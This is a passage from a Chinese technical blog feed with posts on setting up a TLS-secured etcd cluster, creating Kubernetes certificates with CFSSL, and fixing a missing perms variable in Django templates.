-bare server</div><div class="line">server-key.pem</div><div class="line">server.csr</div><div class="line">server.pem</div><div class="line"></div><div class="line">生成对等证书，用于etcd间通信(这里三个节点使用同一个证书,建议分别生成证书):</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=peer etcd.json | cfssljson -bare etcd</div><div class="line">etcd-key.pem</div><div class="line">etcd.csr</div><div class="line">etcd.pem</div><div class="line"></div><div class="line">将CA和etcd证书拷贝到etcd所有节点:</div><div class="line">cp ca.pem  etcd-key.pem etcd.pem server-key.pem server.pem /etc/etcd/ssl/</div></pre></td></tr></table></figure>
<h6 id="安装etcd节点-所有节点"><a href="#安装etcd节点-所有节点" class="headerlink" title="安装etcd节点(所有节点)"></a>安装etcd节点(所有节点)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/coreos/etcd/releases/download/v3.2.7/etcd-v3.2.7-linux-amd64.tar.gz</div><div class="line">tar xf etcd-v3.2.7-linux-amd64.tar.gz</div><div class="line">cd etcd-v3.2.7-linux-amd64</div><div class="line">chmod +x etcd*</div><div class="line">cp etcd* /bin</div></pre></td></tr></table></figure>
<h6 id="etcd配置"><a href="#etcd配置" class="headerlink" title="etcd配置"></a>etcd配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">服务管理(所有节点相同):</div><div class="line">vim /usr/lib/systemd/system/etcd.service</div><div class="line">[Unit]</div><div class="line">Description=Etcd Server</div><div class="line">After=network.target</div><div class="line">After=network-online.target</div><div class="line">Wants=network-online.target</div><div class="line">Documentation=https://github.com/coreos</div><div class="line">[Service]</div><div class="line">Type=notify</div><div class="line">WorkingDirectory=/data/k8s/etcd/</div><div class="line">EnvironmentFile=/etc/etcd/etcd.conf</div><div class="line">ExecStart=/bin/etcd </div><div class="line">  --name=$&#123;NAME&#125; </div><div class="line">  --cert-file=/etc/etcd/ssl/etcd.pem </div><div class="line">  --key-file=/etc/etcd/ssl/etcd-key.pem </div><div class="line">  --peer-cert-file=/etc/etcd/ssl/etcd.pem </div><div class="line">  --peer-key-file=/etc/etcd/ssl/etcd-key.pem </div><div class="line">  --trusted-ca-file=/etc/etcd/ssl/ca.pem </div><div class="line">  --peer-trusted-ca-file=/etc/etcd/ssl/ca.pem </div><div class="line">  --initial-advertise-peer-urls=$&#123;INITIAL_ADVERTISE_PEER_URLS&#125; </div><div class="line">  --listen-peer-urls=$&#123;LISTEN_PEER_URLS&#125; </div><div class="line">  --listen-client-urls=$&#123;LISTEN_CLIENT_URLS&#125; </div><div class="line">  --advertise-client-urls=$&#123;ADVERTISE_CLIENT_URLS&#125; </div><div class="line">  --initial-cluster-token=$&#123;INITIAL_CLUSTER_TOKEN&#125; </div><div class="line">  --initial-cluster=$&#123;INITIAL_CLUSTER&#125; </div><div class="line">  --initial-cluster-state=new </div><div class="line">  --data-dir=$&#123;DATA_DIR&#125;</div><div class="line">Restart=on-failure</div><div class="line">RestartSec=5</div><div class="line">LimitNOFILE=65536</div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div></pre></td></tr></table></figure>
<p>配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">vim /etc/etcd/etcd.conf</div><div class="line">#节点名称</div><div class="line">NAME=&quot;etcd1&quot;</div><div class="line">#etcd数据存放目录</div><div class="line">DATA_DIR=&quot;/data/k8s/etcd&quot;</div><div class="line">#etcd节点间通信监听地址</div><div class="line">LISTEN_PEER_URLS=&quot;https://192.168.234.133:2380&quot;</div><div class="line">#对外提供服务的地址</div><div class="line">LISTEN_CLIENT_URLS=&quot;https://192.168.234.133:2379,https://127.0.0.1:2379&quot;</div><div class="line">#通知其他etcd节点本实例地址</div><div class="line">INITIAL_ADVERTISE_PEER_URLS=&quot;https://192.168.234.133:2380&quot;</div><div class="line">#初始化集群内节点地址</div><div class="line">INITIAL_CLUSTER=&quot;etcd1=https://192.168.234.133:2380,etcd2=https://192.168.234.134:2380,etcd3=https://192.168.234.135:2380&quot;</div><div class="line">#初始化状态.new表示新建,已经存在的集群使用existing</div><div class="line">INITIAL_CLUSTER_STATE=&quot;new&quot;</div><div class="line">#创建集群的token,每个集群唯一</div><div class="line">INITIAL_CLUSTER_TOKEN=&quot;k8s-etcd-cluster&quot;</div><div class="line">#告知其他集群本节点客户端监听地址</div><div class="line">ADVERTISE_CLIENT_URLS=&quot;https://192.168.234.133:2379&quot;</div><div class="line">ETCDCTL_API=3</div><div class="line">其中NAME/LISTEN_PEER_URLS/LISTEN_CLIENT_URLS/INITIAL_ADVERTISE_PEER_URLS/ADVERTISE_CLIENT_URLS替换成相应节点名称和地址</div></pre></td></tr></table></figure></p>
<h6 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum -y install ntp </div><div class="line">systemctl start ntpd </div><div class="line">systemctl start etcd.service</div><div class="line">systemctl stop etcd.service</div><div class="line">systemctl status etcd.service(查看服务状态及日志)</div></pre></td></tr></table></figure>
<h6 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">[root@etcd1 ~]# export etcd1=192.168.234.133</div><div class="line">[root@etcd1 ~]# export etcd2=192.168.234.134</div><div class="line">[root@etcd1 ~]# export etcd3=192.168.234.135</div><div class="line">[root@etcd1 ~]# export ETCDCTL_API=3</div><div class="line">[root@etcd1 ~]# export ENDPOINTS=$etcd1:2379,$etcd2:2379,$etcd3:2379</div><div class="line">查看集群成员:</div><div class="line">[root@etcd1 etcd]#  etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member list</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">|        ID        | STATUS  | NAME  |          PEER ADDRS          |         CLIENT ADDRS         |</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">| 1a4a83ef243ff1c9 | started | etcd2 | https://192.168.234.134:2380 | https://192.168.234.134:2379 |</div><div class="line">| 68243ef8797bd1ce | started | etcd1 | https://192.168.234.133:2380 | https://192.168.234.133:2379 |</div><div class="line">| fa30209a63d949b0 | started | etcd3 | https://192.168.234.135:2380 | https://192.168.234.135:2379 |</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">查看集群状态:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem endpoint status</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">|       ENDPOINT       |        ID        | VERSION | DB SIZE | IS LEADER | RAFT TERM | RAFT INDEX |</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">| 192.168.234.133:2379 | 68243ef8797bd1ce |   3.2.7 |   25 kB |     false |        10 |          9 |</div><div class="line">| 192.168.234.134:2379 | 1a4a83ef243ff1c9 |   3.2.7 |   25 kB |     false |        10 |          9 |</div><div class="line">| 192.168.234.135:2379 | fa30209a63d949b0 |   3.2.7 |   25 kB |      true |        10 |          9 |</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem endpoint health</div><div class="line">192.168.234.135:2379 is healthy: successfully committed proposal: took = 1.374345ms</div><div class="line">192.168.234.134:2379 is healthy: successfully committed proposal: took = 2.217525ms</div><div class="line">192.168.234.133:2379 is healthy: successfully committed proposal: took = 1.996245ms</div><div class="line">保存快照:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot save my.db</div><div class="line">Snapshot saved at my.db</div><div class="line">查看快照状态:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot status my.db</div><div class="line">+----------+----------+------------+------------+</div><div class="line">|   HASH   | REVISION | TOTAL KEYS | TOTAL SIZE |</div><div class="line">+----------+----------+------------+------------+</div><div class="line">| 9a496339 |        3 |          8 |      25 kB |</div><div class="line">+----------+----------+------------+------------+</div><div class="line">恢复数据(要先删除原来数据目录,所有节点操作)：</div><div class="line">[root@etcd1 ~]# etcdctl  --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot restore my.db  --data-dir=/data/k8s/etcd/</div><div class="line">2017-09-09 02:28:52.439616 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32</div><div class="line">删除节点:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member remove 68243ef8797bd1ce</div><div class="line">更新节点:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member update 68243ef8797bd1ce https://192.168.234.133:1111(INITIAL_ADVERTISE_PEER_URLS)</div><div class="line">添加节点(删除etcd3，添加etcd4):</div><div class="line">export etcd4=192.168.234.136</div><div class="line">[root@etcd1 ~]#  etcdctl --endpoints=$&#123;etcd1&#125;:2379,$&#123;etcd2&#125;:2379 --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem  member add etcd4 --peer-urls=http://192.168.234.136:2380</div></pre></td></tr></table></figure>
<blockquote>
<p>Etcd:从应用场景到实现原理的全方位解读 <a href="http://www.infoq.com/cn/articles/etcd-interpretation-application-scenario-implement-principle" target="_blank" rel="external">http://www.infoq.com/cn/articles/etcd-interpretation-application-scenario-implement-principle</a><br>  Eetcd集群管理 <a href="https://coreos.com/etcd/docs/latest/demo.html" target="_blank" rel="external">https://coreos.com/etcd/docs/latest/demo.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
            <tag> etcd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[k8s部署之使用CFSSL创建证书]]></title>
      <url>/2017/09/07/k8s-cfssl-install-cert.html</url>
      <content type="html"><![CDATA[<h4 id="安装CFSSL"><a href="#安装CFSSL" class="headerlink" title="安装CFSSL"></a>安装CFSSL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl -s -L -o /bin/cfssl https://pkg.cfssl.org/R1.2/cfssl_linux-amd64</div><div class="line">curl -s -L -o /bin/cfssljson https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64</div><div class="line">curl -s -L -o /bin/cfssl-certinfo https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64</div><div class="line">chmod +x /bin/cfssl*</div></pre></td></tr></table></figure>
<h4 id="容器相关证书类型"><a href="#容器相关证书类型" class="headerlink" title="容器相关证书类型"></a>容器相关证书类型</h4><blockquote>
<p>client certificate： 用于服务端认证客户端,例如etcdctl、etcd proxy、fleetctl、docker客户端<br>server certificate:  服务端使用，客户端以此验证服务端身份,例如docker服务端、kube-apiserver<br>peer certificate: 双向证书，用于etcd集群成员间通信</p>
</blockquote>
<h4 id="创建CA证书"><a href="#创建CA证书" class="headerlink" title="创建CA证书"></a>创建CA证书</h4><h5 id="生成默认CA配置"><a href="#生成默认CA配置" class="headerlink" title="生成默认CA配置"></a>生成默认CA配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /opt/ssl</div><div class="line">cd /opt/ssl</div><div class="line">cfssl print-defaults config &gt; ca-config.json</div><div class="line">cfssl print-defaults csr &gt; ca-csr.json</div></pre></td></tr></table></figure>
<p><strong>修改ca-config.json,分别配置针对三种不同证书类型的profile,其中有效期43800h为5年</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;signing&quot;: &#123;</div><div class="line">    &quot;default&quot;: &#123;</div><div class="line">        &quot;expiry&quot;: &quot;43800h&quot;</div><div class="line">    &#125;,</div><div class="line">    &quot;profiles&quot;: &#123;</div><div class="line">        &quot;server&quot;: &#123;</div><div class="line">            &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">            &quot;usages&quot;: [</div><div class="line">                &quot;signing&quot;,</div><div class="line">                &quot;key encipherment&quot;,</div><div class="line">                &quot;server auth&quot;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        &quot;client&quot;: &#123;</div><div class="line">            &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">            &quot;usages&quot;: [</div><div class="line">                &quot;signing&quot;,</div><div class="line">                &quot;key encipherment&quot;,</div><div class="line">                &quot;client auth&quot;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        &quot;peer&quot;: &#123;</div><div class="line">            &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">            &quot;usages&quot;: [</div><div class="line">                &quot;signing&quot;,</div><div class="line">                &quot;key encipherment&quot;,</div><div class="line">                &quot;server auth&quot;,</div><div class="line">                &quot;client auth&quot;</div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>修改ca-csr.json</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;CN&quot;: &quot;Self Signed Ca&quot;,</div><div class="line">&quot;key&quot;: &#123;</div><div class="line">    &quot;algo&quot;: &quot;rsa&quot;,</div><div class="line">    &quot;size&quot;: 2048</div><div class="line">&#125;,</div><div class="line">&quot;names&quot;: [</div><div class="line">    &#123;</div><div class="line">        &quot;C&quot;: &quot;CN&quot;,</div><div class="line">        &quot;L&quot;: &quot;SH&quot;,</div><div class="line">        &quot;O&quot;: &quot;Netease&quot;,</div><div class="line">        &quot;ST&quot;: &quot;SH&quot;,            </div><div class="line">        &quot;OU&quot;: &quot;OT&quot;</div><div class="line">    &#125;    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>生成CA证书和私钥</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cfssl gencert -initca ca-csr.json | cfssljson -bare ca -</div><div class="line">生成ca.pem、ca.csr、ca-key.pem(CA私钥,需妥善保管)</div></pre></td></tr></table></figure></p>
<h5 id="签发Server-Certificate"><a href="#签发Server-Certificate" class="headerlink" title="签发Server Certificate"></a>签发Server Certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; server.json</div><div class="line">vim server.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;Server&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;192.168.1.1&quot;</div><div class="line">       ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">生成服务端证书和私钥</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=server server.json | cfssljson -bare server</div></pre></td></tr></table></figure>
<h5 id="签发Client-Certificate"><a href="#签发Client-Certificate" class="headerlink" title="签发Client Certificate"></a>签发Client Certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; client.json</div><div class="line">vim client.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;Client&quot;,</div><div class="line">    &quot;hosts&quot;: [],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">生成客户端证书和私钥</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=client client.json | cfssljson -bare client</div></pre></td></tr></table></figure>
<h5 id="签发peer-certificate"><a href="#签发peer-certificate" class="headerlink" title="签发peer certificate"></a>签发peer certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; member1.json</div><div class="line">vim member1.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;member1&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;192.168.1.1&quot;</div><div class="line">    ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">为节点member1生成证书和私钥:</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=peer member1.json | cfssljson -bare member1</div><div class="line">针对etcd服务,每个etcd节点上按照上述方法生成相应的证书和私钥</div></pre></td></tr></table></figure>
<h5 id="最后校验证书"><a href="#最后校验证书" class="headerlink" title="最后校验证书"></a>最后校验证书</h5><p>校验生成的证书是否和配置相符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">openssl x509 -in ca.pem -text -noout</div><div class="line">openssl x509 -in server.pem -text -noout</div><div class="line">openssl x509 -in client.pem -text -noout</div></pre></td></tr></table></figure></p>
<h4 id="k8s集群所需证书"><a href="#k8s集群所需证书" class="headerlink" title="k8s集群所需证书"></a>k8s集群所需证书</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2017/09/cert.jpg" alt=""></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="https://coreos.com/os/docs/latest/generate-self-signed-certificates.html" target="_blank" rel="external">https://coreos.com/os/docs/latest/generate-self-signed-certificates.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Django模板无法使用perms变量问题]]></title>
      <url>/2017/09/06/django-perms.html</url>
      <content type="html"><![CDATA[<p>首先,在使用Django内置权限管理系统时,settings.py文件要添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">INSTALLED_APPS添加:</div><div class="line">&apos;django.contrib.auth&apos;,</div><div class="line"></div><div class="line">MIDDLEWARE添加:</div><div class="line">&apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;,</div><div class="line"></div><div class="line">&apos;django.contrib.auth.context_processors.auth&apos;,</div><div class="line">TEMPLATES = [</div><div class="line">    &#123;</div><div class="line">        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,</div><div class="line">        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)],</div><div class="line">        &apos;APP_DIRS&apos;: True,</div><div class="line">        &apos;OPTIONS&apos;: &#123;</div><div class="line">            &apos;context_processors&apos;: [</div><div class="line">                &apos;django.template.context_processors.debug&apos;,</div><div class="line">                &apos;django.template.context_processors.i18n&apos;,</div><div class="line">                &apos;django.template.context_processors.media&apos;,</div><div class="line">                &apos;django.template.context_processors.static&apos;,</div><div class="line">                &apos;django.template.context_processors.tz&apos;,</div><div class="line">                &apos;django.contrib.messages.context_processors.messages&apos;,</div><div class="line">                &apos;django.template.context_processors.request&apos;,</div><div class="line">                &apos;django.contrib.auth.context_processors.auth&apos;,</div><div class="line">            ],</div><div class="line">        &#125;,</div><div class="line">    &#125;,</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>如何在模板进行权限检查呢？<br>根据官网说明 <a href="https://docs.djangoproject.com/en/1.11/topics/auth/default/#permissions" target="_blank" rel="external">https://docs.djangoproject.com/en/1.11/topics/auth/default/#permissions</a> ,已登录用户权限保存在模板变量中,是权限模板代理django.contrib.auth.context_processors.PermWrapper的一个实例，<br>具体可以查看django/contrib/auth/context_processors.py源码</p>
<p>测试用例:</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2017/09/codeexample.jpg" alt=""></p>
<p>测试过程中,发现变量压根不存在,没有任何输出;好吧,只能取Debug Django的源码了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Returns context variables required by apps that use Django's authentication</span></div><div class="line"><span class="string">    system.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    If there is no 'user' attribute in the request, uses AnonymousUser (from</span></div><div class="line"><span class="string">    django.contrib.auth).</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">if</span> hasattr(request, <span class="string">'user'</span>):</div><div class="line">        user = request.user</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AnonymousUser</div><div class="line">        user = AnonymousUser()</div><div class="line">    print(user, PermWrapper(user), <span class="string">'-----------------------'</span>)</div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">        <span class="string">'user'</span>: user,</div><div class="line">        <span class="string">'perms'</span>: PermWrapper(user),</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>测试访问接口,发现有的接口有打印权限信息,有的没有，似乎恍然醒悟<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">可以打印权限信息的接口返回:</div><div class="line">return render(request, &apos;fms/fms_add.html&apos;, &#123;&apos;request&apos;: request, &apos;form&apos;: form, &apos;error&apos;: error&#125;)</div><div class="line">不能打印权限新的接口返回:</div><div class="line">return render_to_response( &apos;fms/fms.html&apos;, data)</div></pre></td></tr></table></figure></p>
<p>render和render_to_response区别<br>render是比render_to_reponse更便捷渲染模板的方法,会自动使用RequestContext,而后者需要手动添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return render_to_response(request, &apos;fms/fms_add.html&apos;, &#123;&apos;request&apos;: request, &apos;form&apos;: form, &apos;error&apos;: error&#125;,context_instance=RequestContext(request))</div></pre></td></tr></table></figure></p>
<p>其中RequestContext是django.template.Context的子类.接受request和context_processors,从而将上下文填充渲染到模板<br>问题已经很明确，由于使用了render_to_response方法,没有手动添加context_instance=RequestContext(request)导致模板不能使用变量</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[企业级Docker私有仓库部署(https)]]></title>
      <url>/2017/08/05/docker-harbor-https.html</url>
